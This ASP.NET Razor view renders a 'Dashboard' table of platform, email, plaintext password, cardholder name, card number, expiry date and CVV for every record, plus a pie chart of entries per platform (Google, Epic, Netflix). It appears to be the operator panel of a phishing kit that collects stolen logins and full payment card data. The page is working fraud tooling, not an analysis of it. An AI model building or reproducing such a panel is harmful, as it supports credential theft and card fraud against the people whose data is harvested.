@model List<UserModel>
@{
    Layout = "_Layout";
}
<script>
$(document).ready(function (){
  let table = new DataTable('#example');
})
</script>

<h1>Dashboard</h1>
<br>

<table id="example" class="table table-striped table-bordered" style="width:100%">
    <thead>
    <tr>
        <th>Platform</th>
        <th>Email</th>
        <th>Password</th>
        <th>Name on Card</th>
        <th>CC Number</th>
        <th>CC Expire Date</th>
        <th>CC CVV</th>
    </tr>
    </thead>
    <tbody>
    @foreach(var item in Model)
    {
        <tr>
            <td>@item.platform_id</td>
            <td>@item.user_email</td>
            <td>@item.user_password</td>
            <td>@item.user_name_on_card</td>
            <td>@item.user_cc</td>
            <td>@item.user_date</td>
            <td>@item.user_cvv</td>
                   
        </tr>
    }
    </tbody>
                
</table>

<div id="pie"></div>

<script >
$(document).ready(() => { 
    const options = {
      chart: {
        height: 350,
        type: "pie",
      },
      labels: ["Google", "Epic", "Netflix"],
      series: [@ViewBag.PlatformCounts[1], @ViewBag.PlatformCounts[2], @ViewBag.PlatformCounts[3]],
    }
    const chart = new ApexCharts(
      document.querySelector("#pie"),
      options
    );
    chart.render();
}) 
</script>